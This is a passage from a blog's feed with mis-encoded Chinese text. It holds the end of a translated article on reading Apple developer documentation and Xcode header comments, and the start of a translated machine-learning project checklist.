class_">UIImage</span>?</span><br></pre></td></tr></table></figure><p>æ‚¨åº”è¯¥åœ¨ <code>Creating Specialized Image Objects</code> ç±»åˆ«ä¸­æ‰¾åˆ°å®ƒã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/51361359-6f279a00-1b0a-11e9-8126-7c3318d701f0.png" alt="animatedresizableimagenamed-1"><img src="https://user-images.githubusercontent.com/3297411/51361364-72bb2100-1b0a-11e9-9099-1c3c17356ae9.png" alt="animatedresizableimagenamed-2"></p><p>è¿™ä¸æ˜¯ä¸€ä¸ªå¤æ‚çš„æ–¹æ³•ï¼Œä½†å®ƒç¡®å®å±•ç¤ºäº†è¿™äº›é¡µé¢çš„é‡è¦éƒ¨åˆ†ï¼š</p><ul><li>Apple æœ‰å‡ ç§ä¸åŒçš„æ–¹æ³•æ¥ç¼–å†™æ–¹æ³•åç§°ã€‚ä¹‹å‰çš„é‚£ä¸ª - é•¿ <code>class func animatedResizableImageNamed</code> - ç„¶åæ˜¯æ–¹æ³•é¡µé¢æ ‡é¢˜ä¸­æ˜¾ç¤ºçš„å½¢å¼ï¼ˆ<code>animatedResizableImageNamed(_:capInsets:resizingMode:duration:)</code>ï¼‰ï¼Œä»¥åŠæ–¹æ³•é¡µé¢çš„å£°æ˜éƒ¨åˆ†ä¸­çš„å½¢å¼ã€‚</li><li>æ­£å¦‚æ‚¨åœ¨ç‰ˆæœ¬æ‘˜è¦ä¸­æ‰€çœ‹åˆ°çš„ï¼ˆåœ¨å³ä¾§ï¼‰ï¼Œæ­¤æ–¹æ³•åœ¨ <code>iOS 6.0</code> ä¸­å¼•å…¥ã€‚å› æ­¤ï¼Œè™½ç„¶ä¸»è¦çš„ <code>UIImage</code> ç±»ä»ç¬¬1å¤©å¼€å§‹å°±å·²å­˜åœ¨ï¼Œä½†è¿™ç§æ–¹æ³•æ˜¯åœ¨å‡ å¹´åæ¨å‡ºçš„ã€‚</li><li>æ–¹æ³•å£°æ˜çš„å„ä¸ªéƒ¨åˆ†éƒ½æ˜¯å¯ç‚¹å‡»çš„ï¼Œéƒ½æ˜¯ç´«è‰²çš„ã€‚ä½†æ˜¯è¦å°å¿ƒï¼šå¦‚æœä½ å•å‡» <code>UIImage.ResizingMode</code>ï¼Œä½ å°†å»å“ªé‡Œå–å†³äºä½ æ˜¯å¦ç‚¹å‡»äº†â€œUIImageâ€æˆ–â€œResizingModeâ€ã€‚ ï¼ˆæç¤ºï¼šæ‚¨é€šå¸¸éœ€è¦å•å‡»å³ä¾§çš„é‚£ä¸ªã€‚ï¼‰</li><li>æ‚¨å°†çœ‹åˆ°æ¯ä¸ªå‚æ•°å«ä¹‰å’Œè¿”å›å€¼çš„ç®€è¦è¯´æ˜ã€‚</li><li>â€œè®¨è®ºâ€ï¼ˆ<code>Discussion</code>ï¼‰éƒ¨åˆ†è¯¦ç»†ä»‹ç»äº†æ­¤æ–¹æ³•çš„å…·ä½“ä½¿ç”¨è¯´æ˜ã€‚è¿™å‡ ä¹æ€»æ˜¯ - æ¯ä¸ªé¡µé¢ä¸­æœ€æœ‰ç”¨çš„éƒ¨åˆ†ï¼Œå› ä¸ºåœ¨è¿™é‡Œæ‚¨å¯ä»¥çœ‹åˆ°â€œä¸è¦è°ƒç”¨æ­¤æ–¹æ³•â€æˆ–â€œå°å¿ƒâ€¦â€</li><li>ä½ å¯èƒ½ä¼šæ‰¾åˆ°ä¸€ä¸ª <code>See Also</code> éƒ¨åˆ†ï¼Œä½†è¿™æœ‰ç‚¹å—æ¬¢è¿ - è¿™é‡Œåªæ˜¯æˆ‘ä»¬åœ¨ä¸Šä¸€é¡µçš„æ–¹æ³•åˆ—è¡¨ã€‚</li></ul><p>ç°åœ¨ï¼Œ<code>UIImage</code> æ˜¯ä¸€ä¸ªè€ç±»ï¼Œå¹¶æ²¡æœ‰å¤ªå¤§å˜åŒ–ï¼Œå› æ­¤å®ƒçš„æ–‡æ¡£å¤„äºè‰¯å¥½çŠ¶æ€ã€‚ä½†æ˜¯ä¸€äº›è¾ƒæ–°çš„ API - ä»¥åŠè®¸å¤šæ²¡æœ‰åƒ <code>UIKit</code> é‚£æ ·è¢«å–œæ¬¢çš„æ—§ API - ä»ç„¶è®°å½•ä¸è¶³ã€‚ä¾‹å¦‚ï¼Œæ¥è‡ª <code>SceneKit</code> çš„ <code>SCNAnimation</code> æˆ–æ¥è‡ª <code>UIKit</code> çš„ <code>UITextDragPreviewRenderer</code>ï¼šä¸¤è€…éƒ½æ˜¯åœ¨ iOS 11 ä¸­å¼•å…¥çš„ï¼Œå¹¶ä¸”åœ¨å®ƒä»¬å‘å¸ƒ18ä¸ªæœˆåä»ç„¶åŒ…å«â€œæ— å¯ç”¨æ¦‚è¿°ï¼ˆNo overview availableï¼‰â€ä½œä¸ºå…¶æ–‡æ¡£ã€‚</p><p>å½“ä½ çœ‹åˆ°â€œæ²¡æœ‰å¯ç”¨çš„æ¦‚è¿°ï¼ˆNo overview availableï¼‰â€æ—¶ï¼Œä½ ä¼šå¤±æœ›ï¼Œä½†ä¸è¦æ”¾å¼ƒï¼šè®©æˆ‘å‘Šè¯‰ä½ æ¥ä¸‹æ¥è¦åšä»€ä¹ˆâ€¦</p><h2><span id="cha-kan-dai-ma">æŸ¥çœ‹ä»£ç </span></h2><p>å°½ç®¡ Apple çš„åœ¨çº¿æ–‡æ¡£ç›¸å½“ä¸é”™ï¼Œä½†æ‚¨ç»å¸¸ä¼šé‡åˆ°â€œæ— å¯ç”¨æ¦‚è¿°ï¼ˆNo overview availableï¼‰â€ï¼Œæˆ–è€…æ‚¨å‘ç°æ²¡æœ‰è¶³å¤Ÿçš„ä¿¡æ¯æ¥å›ç­”æ‚¨çš„é—®é¢˜ã€‚</p><p><a href="https://en.wikipedia.org/wiki/Conway%27s_law">åº·å¨å®šå¾‹ï¼ˆConwayâ€™s lawï¼‰</a>æŒ‡å‡ºï¼Œè®¾è®¡ç³»ç»Ÿçš„ç»„ç»‡å—åˆ¶äºè®¾è®¡ï¼Œè¿™äº›è®¾è®¡æ˜¯è¿™äº›ç»„ç»‡çš„é€šä¿¡ç»“æ„çš„å‰¯æœ¬ã€‚â€œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä½ ä»¥æŸç§æ–¹å¼å·¥ä½œï¼Œä½ å°†ä»¥ç±»ä¼¼çš„æ–¹å¼è®¾è®¡äº‹ç‰©ã€‚</p><p>Apple åœ¨æˆ‘ä»¬è¡Œä¸šä¸­çš„ç‹¬ç‰¹åœ°ä½ä½¿ä»–ä»¬ä»¥ä¸€ç§ç›¸å½“ä¸å¯»å¸¸çš„æ–¹å¼å·¥ä½œ - å‡ ä¹å¯ä»¥è‚¯å®šå®ƒä¸æ‚¨è‡ªå·±å…¬å¸çš„å·¥ä½œæ–¹å¼å®Œå…¨ä¸åŒã€‚æ˜¯çš„ï¼Œä»–ä»¬æœ‰ API å®¡æ ¸è®¨è®ºï¼Œä»–ä»¬è¯•å›¾è®¨è®ºAPIåº”è¯¥å¦‚ä½•ç”¨ä¸¤ç§è¯­è¨€çœ‹å¾…ï¼Œæ˜¯çš„ï¼Œä»–ä»¬æœ‰ä¸“é—¨çš„å›¢é˜Ÿæ¥åˆ¶ä½œæ–‡æ¡£å’Œç¤ºä¾‹ä»£ç ã€‚</p><p>ä½†æ˜¯ä»–ä»¬è·å–ç¤ºä¾‹ä»£ç çš„é—¨æ§›éå¸¸é«˜ï¼šé€šå¸¸éœ€è¦ä¸€äº›éå¸¸å¥½çš„ä¸œè¥¿æ‰èƒ½æ‹¿å‡ºæ¥ï¼Œå¹¶ä¸”é€šè¿‡å¤šå±‚æ£€æŸ¥æ¥å¤„ç†æ³•å¾‹é—®é¢˜ã€‚å› æ­¤ï¼Œè™½ç„¶æˆ‘å¯ä»¥åœ¨ä¸€å°æ—¶å†…è¾“å…¥ä¸€ä¸ªé¡¹ç›®å¹¶ç«‹å³å°†å…¶å‘å¸ƒä¸ºæ–‡ç« ï¼Œä½† Apple éœ€è¦èŠ±è´¹æ›´é•¿çš„æ—¶é—´æ‰èƒ½å®ŒæˆåŒæ ·çš„å·¥ä½œ - ä»–ä»¬éå¸¸è®¤çœŸåœ°å¯¹å¾…ä»–ä»¬çš„å½¢è±¡ï¼Œè€Œä¸”éå¸¸æ­£ç¡®ã€‚å¦‚æœä½ æ›¾ç»æƒ³è¿‡ä¸ºä»€ä¹ˆæ–‡ç« å¾ˆå°‘å‡ºç°åœ¨å®˜æ–¹ Swift åšå®¢ä¸Šï¼Œç°åœ¨ä½ çŸ¥é“äº†ï¼</p><p>ç°åœ¨ï¼Œæˆ‘è¯´è¿™ä¸€åˆ‡çš„åŸå› æ˜¯ Apple æœ‰ä¸€ä¸ªå¿«é€Ÿä½¿ç”¨çš„æ·å¾„ï¼šä»–ä»¬çš„å·¥ç¨‹å¸ˆåœ¨ä»–ä»¬çš„ä»£ç ä¸­ç•™ä¸‹è¯„è®ºçš„é—¨æ§›ä¼¼ä¹æ˜¾ç€é™ä½ï¼Œè¿™æ„å‘³ç€ä½ ç»å¸¸ä¼šåœ¨ Xcode ä¸­æ‰¾åˆ°æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚è¿™äº›è¯„è®ºå°±åƒç»†å°çš„é‡‘å­ï¼ˆgold dustï¼‰ä¸€æ ·ï¼šå®ƒä»¬ç›´æ¥æ¥è‡ª Apple çš„å¼€å‘è€…ï¼Œè€Œä¸æ˜¯ä»–ä»¬çš„å¼€å‘è€…å‡ºç‰ˆï¼ˆdeveloper publicationsï¼‰å›¢é˜Ÿï¼Œè€Œä¸”æˆ‘å¯¹ devpubs éå¸¸çƒ­çˆ±ï¼Œå¾ˆé«˜å…´ç›´æ¥å¬åˆ°æ¥è‡ªæºå¤´çš„å£°éŸ³ã€‚</p><p>è¿˜è®°å¾—æˆ‘æåˆ°è¿‡ SceneKit çš„ <code>SCNAnimation</code> åœ¨ Apple çš„å¼€å‘è€…ç½‘ç«™ä¸Šæ²¡æœ‰è®°å½•å—ï¼Ÿå¥½å§ï¼Œè®©æˆ‘ä»¬æ¥çœ‹çœ‹Xcodeå¯ä»¥å‘æˆ‘ä»¬å±•ç¤ºçš„å†…å®¹ï¼šæŒ‰ <code>Cmd + O</code> æ‰“å¼€â€œå¿«é€Ÿæ‰“å¼€ï¼ˆOpen Quicklyï¼‰â€èœå•ï¼Œç¡®ä¿å³ä¾§çš„ Swift å›¾æ ‡ä¸ºå½©è‰²è€Œä¸æ˜¯ç©ºå¿ƒï¼Œç„¶åé”®å…¥â€œSCNAnimationâ€ã€‚</p><p>æ‚¨å°†çœ‹åˆ°åˆ—å‡ºçš„ä¸€äº›é€‰é¡¹ï¼Œä½†æ‚¨æ­£åœ¨å¯»æ‰¾ <code>SCNAnimation.h</code> ä¸­å®šä¹‰çš„é€‰é¡¹ã€‚å¦‚æœæ‚¨ä¸ç¡®å®šï¼Œé€‰æ‹© <code>YourClassName.h</code> æ–‡ä»¶æ˜¯æ‚¨æœ€å¥½çš„é€‰æ‹©ã€‚</p><p>æ— è®ºå¦‚ä½•ï¼Œå¦‚æœä½ æ‰“å¼€ <code>SCNAnimation.h</code> Xcode å°†æ˜¾ç¤ºç”Ÿæˆçš„ SCNAnimation å¤´æ–‡ä»¶ç‰ˆæœ¬ã€‚å®ƒçš„ç”Ÿæˆæ˜¯å› ä¸ºåŸå§‹ç‰ˆæœ¬æ˜¯Objective-Cï¼Œå› æ­¤ Xcode ä¸º Swift è¿›è¡Œäº†å®æ—¶ç¿»è¯‘ - è¿™å°±æ˜¯ <code>Swift Quickly</code> æ¡†ä¸­çš„å½©è‰² Swift å¾½æ ‡çš„å«ä¹‰ã€‚</p><p>ç°åœ¨ï¼Œå¦‚æœä½ æŒ‰ <code>Cmd + F</code> å¹¶æœç´¢â€œclass SCNAnimationâ€ï¼Œä½ ä¼šå‘ç°ï¼š</p><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> SCNAnimation represents an animation that targets a specific key path.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">@available</span>(<span class="keyword">iOS</span> <span class="number">11.0</span>, <span class="operator">*</span>)</span><br><span class="line"><span class="keyword">open</span> <span class="keyword">class</span> <span class="title class_">SCNAnimation</span> : <span class="title class_">NSObject</span>, <span class="title class_">SCNAnimationProtocol</span>, <span class="title class_">NSCopying</span>, <span class="title class_">NSSecureCoding</span> &#123;  </span><br><span class="line">    <span class="comment">/*!</span></span><br><span class="line"><span class="comment">     Initializers</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     Loads and returns an animation loaded from the specified URL.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     @param animationUrl The url to load.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="comment">/*not inherited*/</span> <span class="keyword">init</span>(<span class="params">contentsOf</span> <span class="params">animationUrl</span>: <span class="type">URL</span>)</span><br></pre></td></tr></table></figure><p>è¿™åªæ˜¯ä¸€ä¸ªå¼€å§‹ã€‚ æ˜¯çš„ï¼Œè¯¥ç±»åŠå…¶æ‰€æœ‰å†…éƒ¨éƒ½æœ‰æ–‡æ¡£ï¼ŒåŒ…æ‹¬ç”¨æ³•è¯´æ˜ï¼Œé»˜è®¤å€¼ç­‰ã€‚ æ‰€æœ‰è¿™ä¸€åˆ‡éƒ½åº”è¯¥åœ¨åœ¨çº¿æ–‡æ¡£ä¸­ï¼Œä½†æ— è®ºå‡ºäºä»€ä¹ˆåŸå› å®ƒä»ç„¶æ²¡æœ‰ï¼Œæ‰€ä»¥è¦å‡†å¤‡å¥½æŸ¥æ‰¾ä»£ç ä½œä¸ºä¸€ä¸ªæœ‰ç”¨çš„è¡¥å……ã€‚</p><h2><span id="zui-hou-de-ti-shi">æœ€åçš„æç¤º</span></h2><p>æ­¤æ—¶ï¼Œæ‚¨åº”è¯¥èƒ½å¤ŸæŸ¥æ‰¾åœ¨çº¿æ–‡æ¡£ä»¥è·å–æ‚¨å–œæ¬¢çš„ä»»ä½•ä»£ç ï¼Œå¹¶æŸ¥æ‰¾å¤´æ–‡ä»¶æ³¨é‡Šä»¥è·å–é¢å¤–çš„ä½¿ç”¨è¯´æ˜ã€‚</p><p>ä½†æ˜¯ï¼Œåœ¨å‡†å¤‡å¥½é¢å¯¹å…¨éƒ¨ Apple æ–‡æ¡£ä¹‹å‰ï¼Œè¿˜æœ‰ä¸¤ä»¶äº‹éœ€è¦äº†è§£ã€‚</p><p>é¦–å…ˆï¼Œæ‚¨ç»å¸¸ä¼šé‡åˆ°æ ‡è®°ä¸ºâ€œå·²å½’æ¡£ï¼ˆarchivedâ€ï¼‰â€ï¼Œâ€œé—ç•™ï¼ˆâ€œlegacyâ€ï¼‰â€æˆ–â€œå·²é€€ä¼‘ï¼ˆâ€œretiredï¼‰â€çš„æ–‡æ¡£ - å³ä½¿å¯¹äºç›¸å¯¹è¾ƒæ–°çš„äº‹ç‰©ä¹Ÿæ˜¯å¦‚æ­¤ã€‚å½“å®ƒçœŸçš„è€äº†ï¼Œä½ ä¼šçœ‹åˆ°è¯¸å¦‚â€œè¿™ç¯‡æ–‡ç« å¯èƒ½ä¸ä»£è¡¨å½“å‰å‘å±•çš„æœ€ä½³å®è·µâ€ä¹‹ç±»çš„æ¶ˆæ¯ã€‚ä¸‹è½½å’Œå…¶ä»–èµ„æºçš„é“¾æ¥å¯èƒ½ä¸å†æœ‰æ•ˆã€‚â€œ</p><p>å°½ç®¡ Apple æ˜¯ä¸–ç•Œä¸Šæœ€å¤§çš„å…¬å¸ä¹‹ä¸€ï¼Œä½† Apple çš„å·¥ç¨‹å’Œ devpubs å›¢é˜Ÿå‡ ä¹æ²¡æœ‰äººå‘˜ - ä»–ä»¬ä¸å¯èƒ½åœ¨ä¿ç•™æ‰€æœ‰å†…å®¹çš„åŒæ—¶è¦†ç›–æ–°çš„ APIã€‚å› æ­¤ï¼Œå½“ä½ çœ‹åˆ°â€œå­˜æ¡£â€æ–‡æ¡£æˆ–ç±»ä¼¼æ–‡ä»¶æ—¶ï¼Œè¯·è¿ç”¨ä½ çš„åˆ¤æ–­ï¼šå¦‚æœå®ƒåœ¨æŸä¸ªç‰ˆæœ¬çš„ Swift ä¸­è‡³å°‘ä½ çŸ¥é“å®ƒæœ€è¿‘æ˜¯æ¨¡ç³Šçš„ï¼Œä½†å³ä½¿ä¸æ˜¯ï¼Œä½ ä»ç„¶å¯èƒ½ä¼šå‘ç°é‚£é‡Œæœ‰å¾ˆå¤šæœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚</p><p>å…¶æ¬¡ï¼ŒApple æ‹¥æœ‰ä¸€äº›ç‰¹åˆ«æœ‰ä»·å€¼çš„å‡ºè‰²æ–‡æ¡£ã€‚è¿™äº›éƒ½åˆ—åœ¨ <a href="https://developer.apple.com">https://developer.apple.com</a> çš„é¡µè„šä¸­ï¼Œä½†ä¸»è¦æ˜¯<a href="https://developer.apple.com/design/human-interface-guidelines/">äººæœºç•Œé¢æŒ‡å—</a>ã€‚è¿™å°†å¼•å¯¼æ‚¨å®Œæ•´åœ°ä¸º Apple å¹³å°è®¾è®¡åº”ç”¨ç¨‹åºçš„æ‰€æœ‰éƒ¨åˆ†ï¼ŒåŒ…æ‹¬è¯´æ˜å…³é”®ç‚¹çš„å›¾ç‰‡ï¼Œå¹¶æä¾›å¤§é‡å…·ä½“å»ºè®®ã€‚å³ä½¿è¿™ä¸ªæ–‡æ¡£æ˜¯æ„å»º iOS åº”ç”¨ç¨‹åºæ—¶æœ€é‡è¦çš„ä¸€ä¸ªï¼Œä½†å¾ˆå°‘æœ‰å¼€å‘äººå‘˜ä¼¼ä¹å·²ç»é˜…è¯»è¿‡å®ƒï¼</p><h2><span id="jie-xia-lai-zuo-shi-me">æ¥ä¸‹æ¥åšä»€ä¹ˆï¼Ÿ</span></h2><p>æˆ‘ä¹‹å‰æ›¾å†™è¿‡<a href="https://www.hackingwithswift.com/articles/42/apple-can-we-please-talk-about-your-documentation">å…³äº Apple æ–‡æ¡£çš„é—®é¢˜</a> - æˆ‘æ‹…å¿ƒé‚£é‡Œæ²¡æœ‰é¼“åŠ±ï¼Œä½†è‡³å°‘å¦‚æœä½ åœ¨åŠªåŠ›ï¼Œå®ƒå¯èƒ½ä¼šè®©ä½ è§‰å¾—ä¸é‚£ä¹ˆå­¤å•ã€‚</p><p>å¹¸è¿çš„æ˜¯ï¼Œæˆ‘æœ‰å¾ˆå¤šå¯èƒ½æ›´æœ‰ç”¨çš„ææ–™ï¼š</p><ul><li>æˆ‘çš„<a href="https://www.hackingwithswift.com/example-code">SwiftçŸ¥è¯†åº“ï¼ˆSwift Knowledge Baseï¼‰</a>åŒ…å«é’ˆå¯¹ Swift å’Œ iOS å¼€å‘äººå‘˜çš„600å¤šä¸ªé—®ç­”ï¼ŒæŠ€å·§å’ŒæŠ€æœ¯ç‚¹ - å®ƒå¯ä»¥å¸®åŠ©æ‚¨æ›´å¿«åœ°è§£å†³é—®é¢˜ã€‚</li><li>æˆ‘çš„<a href="https://www.hackingwithswift.com/glossary">Swiftæœ¯è¯­è¡¨ï¼ˆGlossary of Common Swift Termsï¼‰</a>åœ¨ Swift å¼€å‘ä¸­å®šä¹‰äº†100å¤šä¸ªå¸¸ç”¨æœ¯è¯­ï¼Œæ‰€æœ‰æœ¯è¯­éƒ½åœ¨ä¸€é¡µä¸Šã€‚</li><li><a href="https://www.hackingwithswift.com/read">æˆ‘æœ‰ä¸€æœ¬å…¨ä¹¦ä½¿ç”¨é¡¹ç›®æ•™æˆ Swift å’Œ iOS</a>ï¼Œå®ƒä¸“é—¨ç”¨äºåœ¨é€»è¾‘æµç¨‹ä¸­å¼•å…¥æ¦‚å¿µã€‚</li></ul><p>æ‚¨è®¤ä¸ºé˜…è¯»Appleæ–‡æ¡£æœ€æœ‰æ•ˆçš„æ–¹æ³•æ˜¯ä»€ä¹ˆï¼Ÿ åœ¨Twitterä¸Šå‘é€ä½ çš„æç¤ºï¼š<a href="https://twitter.com/twostraws">@twostraws</a>ã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      å¦‚ä½•é˜…è¯»è‹¹æœå¼€å‘æ–‡æ¡£
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="iOS" scheme="https://qiwihui.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>æœºå™¨å­¦ä¹ é¡¹ç›®æ¸…å•</title>
    <link href="https://qiwihui.com/qiwihui-blog-56/"/>
    <id>https://qiwihui.com/qiwihui-blog-56/</id>
    <published>2022-08-13T01:54:25.510Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://www.ic.unicamp.br/~sandra/pdf/Hands_On_Machine_Learning_with_Scikit_Learn_and_TensorFlow-427-432.pdf">åŸæ–‡</a>æ¥è‡ªäºã€Š<a href="https://book.douban.com/subject/26840215/">Hands-On Machine Learning with Scikit-Learn and TensorFlow</a>ã€‹ï¼Œè¿™æ˜¯ä¸€æœ¬ç³»ç»Ÿå­¦ä¹ æœºå™¨å­¦ä¹ å’Œæ·±åº¦å­¦ä¹ éå¸¸ä¸é”™çš„å…¥é—¨ä¹¦ç±ï¼Œç†è®ºå’Œå®è·µå…¼è€Œæœ‰ä¹‹ã€‚</p><p>æ­¤æ¸…å•å¯ä»¥æŒ‡å¯¼ä½ å®Œæˆæœºå™¨å­¦ä¹ é¡¹ç›®ã€‚ä¸»è¦æœ‰å…«ä¸ªæ­¥éª¤ï¼š</p><ol><li>å°†é—®é¢˜æ¡†æ¶åŒ–å¹¶ä¸”å…³æ³¨é‡ç‚¹ã€‚</li><li>è·å–æ•°æ®ã€‚</li><li>æ¢ç´¢æ•°æ®ä»¥æ´æ‚‰æ•°æ®ã€‚</li><li>å‡†å¤‡æ•°æ®ä»¥æ›´å¥½åœ°å°†åŸºç¡€æ•°æ®æ¨¡å¼æš´éœ²ç»™æœºå™¨å­¦ä¹ ç®—æ³•ã€‚</li><li>æ¢ç´¢å¤šç§ä¸åŒçš„æ¨¡å‹å¹¶åˆ—å‡ºæœ€å¥½çš„é‚£äº›ã€‚</li><li>å¾®è°ƒæ¨¡å‹å¹¶å°†å®ƒä»¬ç»„åˆæˆä¸€ä¸ªå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆã€‚</li><li>å±•ç¤ºä½ çš„è§£å†³æ–¹æ¡ˆã€‚</li><li>å¯åŠ¨ï¼Œç›‘ç£å¹¶ç»´æŠ¤ä½ çš„ç³»ç»Ÿã€‚</li></ol><p>æ˜¾ç„¶ï¼Œä½ åº”è¯¥æ ¹æ®ä½ çš„éœ€æ±‚è°ƒæ•´æ­¤æ¸…å•ã€‚</p><span id="more"></span><h2><span id="jiang-wen-ti-kuang-jia-hua-bing-qie-guan-zhu-chong-dian">å°†é—®é¢˜æ¡†æ¶åŒ–å¹¶ä¸”å…³æ³¨é‡ç‚¹</span></h2><ol><li>ç”¨ä¸šåŠ¡æœ¯è¯­å®šä¹‰ç›®æ ‡ã€‚</li><li>ä½ çš„è§£å†³æ–¹æ¡ˆå°†å¦‚ä½•ä½¿ç”¨ï¼Ÿ</li><li>ç›®å‰çš„è§£å†³æ–¹æ¡ˆ/è§£å†³æ–¹æ³•ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ</li><li>ä½ åº”è¯¥å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜ï¼ˆç›‘ç£/éç›‘ç£ï¼Œåœ¨çº¿/ç¦»çº¿ç­‰ï¼‰ï¼Ÿ</li><li>å¦‚ä½•åº¦é‡æ¨¡å‹çš„è¡¨ç°ï¼Ÿ</li><li>æ¨¡å‹çš„è¡¨ç°æ˜¯å¦å’Œä¸šåŠ¡ç›®æ ‡ä¸€è‡´ï¼Ÿ</li><li>è¾¾åˆ°ä¸šåŠ¡ç›®æ ‡æ‰€éœ€çš„æœ€ä½æ€§èƒ½æ˜¯å¤šå°‘ï¼Ÿ</li><li>ç±»ä¼¼çš„é—®é¢˜å¦‚ä½•è§£å†³ï¼Ÿæ˜¯å¦å¯ä»¥å¤ç”¨ç»éªŒæˆ–å·¥å…·ï¼Ÿ</li><li>äººå‘˜æ˜¯å¦ä¸“ä¸šï¼Ÿ</li><li>ä½ å¦‚ä½•åŠ¨æ‰‹è§£å†³é—®é¢˜ï¼Ÿ</li><li>åˆ—å‡ºç›®å‰ä½ ï¼ˆæˆ–è€…å…¶ä»–äººï¼‰æ‰€åšçš„å‡è®¾ã€‚</li><li>å¦‚æœå¯èƒ½ï¼ŒéªŒè¯å‡è®¾ã€‚</li></ol><h2><span id="huo-qu-shu-ju">è·å–æ•°æ®</span></h2><p>æ³¨æ„ï¼šå°½å¯èƒ½è‡ªåŠ¨åŒ–ï¼Œä»¥ä¾¿ä½ è½»æ¾è·å–æ–°æ•°æ®ã€‚</p><ol><li>åˆ—å‡ºä½ éœ€è¦çš„æ•°æ®å’Œæ•°æ®é‡ã€‚</li><li>æŸ¥æ‰¾å¹¶è®°å½•ä½ å¯ä»¥è·å–è¯¥æ•°æ®çš„ä½ç½®ã€‚</li><li>æ£€æŸ¥å®ƒå°†å ç”¨å¤šå°‘å­˜å‚¨ç©ºé—´ã€‚</li><li>æ£€æŸ¥æ³•å¾‹ä¹‰åŠ¡å¹¶åœ¨å¿…è¦æ—¶è·å–æˆæƒã€‚</li><li>è·å–è®¿é—®æƒé™ã€‚</li><li>åˆ›å»ºå·¥ä½œç›®å½•ï¼ˆæ‹¥æœ‰è¶³å¤Ÿçš„å­˜å‚¨ç©ºé—´ï¼‰ã€‚</li><li>è·å–æ•°æ®ã€‚</li><li>å°†æ•°æ®è½¬æ¢ä¸ºä½ å¯ä»¥è½»æ¾æ“ä½œçš„æ ¼å¼ï¼ˆä¸æ›´æ”¹æ•°æ®æœ¬èº«ï¼‰ã€‚</li><li>ç¡®ä¿åˆ é™¤æˆ–ä¿æŠ¤æ•æ„Ÿä¿¡æ¯ï¼ˆæ¯”å¦‚ï¼ŒåŒ¿åï¼‰ã€‚</li><li>æ£€æŸ¥æ•°æ®çš„å¤§å°å’Œç±»å‹ï¼ˆæ—¶é—´åºåˆ—ï¼Œæ ·æœ¬ï¼Œåœ°ç†ä¿¡æ¯ç­‰ï¼‰ã€‚</li><li>æŠ½æ ·å‡ºæµ‹è¯•é›†ï¼Œå°†å®ƒæ”¾åœ¨ä¸€è¾¹ï¼Œä»¥åä¸éœ€è¦å…³æ³¨å®ƒï¼ˆæ²¡æœ‰æ•°æ®çª¥æ¢ï¼ï¼‰ã€‚</li></ol><h2><span id="tan-suo-shu-ju">æ¢ç´¢æ•°æ®</span></h2><p>æ³¨æ„ï¼šå°è¯•ä»é¢†åŸŸä¸“å®¶é‚£è·å–æœ‰å…³è¿™äº›æ­¥éª¤çš„è§è§£ã€‚</p><ol><li>åˆ›å»ºç”¨äºæ¢ç´¢çš„æ•°æ®å‰¯æœ¬ï¼ˆå¦‚æœ‰å¿…è¦ï¼Œå°†å…¶å–æ ·ä¸ºå¯ç®¡ç†çš„å¤§å°ï¼‰ã€‚</li><li>åˆ›å»ºä¸€ä¸ª Jupyter ç¬”è®°æœ¬æ¥è®°å½•ä½ çš„æ•°æ®æ¢ç´¢ã€‚</li><li>ç ”ç©¶æ¯ä¸ªå±æ€§åŠå…¶ç‰¹å¾ï¼š</li></ol><ul><li>åç§°ï¼›</li><li>ç±»å‹ï¼ˆåˆ†ç±»ï¼Œæ•´æ•°/æµ®ç‚¹æ•°ï¼Œæœ‰ç•Œ/æ— ç•Œï¼Œæ–‡æœ¬ï¼Œç»“æ„åŒ–æ•°æ®ç­‰ï¼‰ï¼›</li><li>ç¼ºå¤±æ•°æ®çš„ç™¾åˆ†æ¯”ï¼›</li><li>å™ªå£°ç‚¹å’Œå®ƒçš„ç±»å‹ï¼ˆéšæœºç‚¹ï¼Œå¼‚å¸¸ç‚¹ï¼Œèˆå…¥è¯¯å·®ç­‰ï¼‰ï¼›</li><li>å¯¹ä»»åŠ¡å¯èƒ½æœ‰ç”¨å—ï¼Ÿ</li><li>åˆ†å¸ƒç±»å‹ï¼ˆé«˜æ–¯åˆ†å¸ƒï¼Œå‡åŒ€åˆ†å¸ƒï¼Œå¯¹æ•°åˆ†å¸ƒç­‰ï¼‰ã€‚</li></ul><ol start="4"><li>å¯¹äºç›‘ç£å­¦ä¹ ä»»åŠ¡ï¼Œç¡®å®šç›®æ ‡å±æ€§ã€‚</li><li>å¯è§†åŒ–æ•°æ®ã€‚</li><li>ç ”ç©¶å±æ€§é—´çš„ç›¸å…³æ€§ã€‚</li><li>ç ”ç©¶æ€å¦‚ä½•æ‰‹åŠ¨è§£å†³é—®é¢˜ã€‚</li><li>ç¡®å®šä½ æƒ³è¦åº”ç”¨çš„æœ‰æ•ˆçš„è½¬æ¢ã€‚</li><li>ç¡®å®šæœ‰ç”¨çš„é¢å¤–æ•°æ®ã€‚</li><li>è®°å½•ä½ æ‰€å­¦åˆ°çš„çŸ¥è¯†ã€‚</li></ol><h2><span 